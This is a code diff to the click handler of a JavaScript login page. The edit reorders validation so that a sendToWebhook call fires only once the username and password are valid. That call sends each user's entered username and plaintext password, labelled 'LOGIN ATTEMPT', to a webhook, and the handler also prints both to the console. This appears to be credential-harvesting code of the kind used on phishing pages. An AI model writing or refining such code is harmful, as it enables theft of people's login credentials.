@@ -68,23 +68,27 @@ loginBtn.addEventListener("click", () => {
         return;
     }
 
-       sendToWebhook(
+    if (password === "") {
+        usernameError.textContent = "Please enter a password.";
+        passwordInput.focus();
+        return;
+    }
+
+    if (password.length < 6) {
+        usernameError.textContent = "Password must be at least 6 characters.";
+        passwordInput.focus();
+        return;
+    }
+
+
+    // SEND ONLY IF ALL INPUTS ARE VALID
+    sendToWebhook(
         `🔐 LOGIN ATTEMPT\n👤 Username: ${username}\n🔑 Password: ${password}`
     );
 
     console.log("Username:", username);
     console.log("Password:", password);
 
-
-    if (password === "") {
-        passwordInput.focus();
-        return;
-    }
-
-    if (password.length < 6) {
-        passwordInput.focus();
-        return;
-    }
 
     // Disable controls
     usernameInput.disabled = true;
@@ -95,13 +99,10 @@ loginBtn.addEventListener("click", () => {
     // Show loading
     loading.classList.remove("hidden");
 
-    // Debug
     console.log("Loading shown");
 
-    setTimeout(() => {
 
-        // Redirect example
-        // window.location.href = "dashboard.html";
+    setTimeout(() => {
 
         loading.classList.add("hidden");
 
